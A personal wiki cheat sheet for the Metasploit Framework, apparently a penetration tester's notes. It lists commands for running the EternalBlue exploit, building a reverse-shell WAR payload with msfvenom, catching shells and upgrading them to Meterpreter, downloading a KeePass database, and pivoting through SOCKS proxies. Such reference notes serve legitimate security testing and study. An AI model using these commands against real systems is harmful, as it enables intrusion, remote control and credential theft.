Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2020-10-30T12:59:10-07:00

====== Metasploit Framework ======
Created Friday 30 October 2020

Start Metasploit:
# msfconsole
Search exploit:
> search eternalblue
Use exploit:
msf > use exploit/windows/smb/ms17_…
Configure exploit:
msf exploit(…) > show options
msf exploit(…) > set TARGET 10.5.23.42
Run exploit:
msf exploit(…) > exploit
Generate reverse shell (WAR):
# msfvenom -p
java/jsp_shell_reverse_tcp LHOST=<your
ip address> LPORT=443 -f war > sh.war
Reverse shell listener:
> use exploit/multi/handler
> set payload
linux/x64/shell_reverse_tcp
> set LHOST 10.5.23.42 # attacker
> set LPORT 443
> exploit
Upgrade to Meterpreter (or press ^Z (Ctrl-Z)):
background
Background session 1? [y/N] y
> sessions # list sessions
> sessions -u 1 # Upgrade
> sessions 2 # interact with session 2
meterpreter > sysinfo # use it
Upload / download files:
meterpreter > upload pwn.exe
meterpreter > download c:\keepass.kdb
Execute a file:
meterpreter > execute -i -f /your/bin
Port forwarding to localhost:
meterpreter > portfwd add -l 2323 -p
3389 -r 10.5.23.23
Background Meterpreter session:
meterpreter > background
Pivoting through existing Meterpreter session:
> use post/multi/manage/autoroute
> set session 2 # meterpreter session
> run
> route
SOCKS via Meterpreter (requires autoroute):
> use auxiliary/server/socks4a
> set SRVPORT 8080
> run
Configure ProxyChains:
# vi /etc/proxychains.conf
[...]
socks4 127.0.0.1 1080
Connect through SOCKS proxy:
# proxychains ncat 172.23.5.42 1337
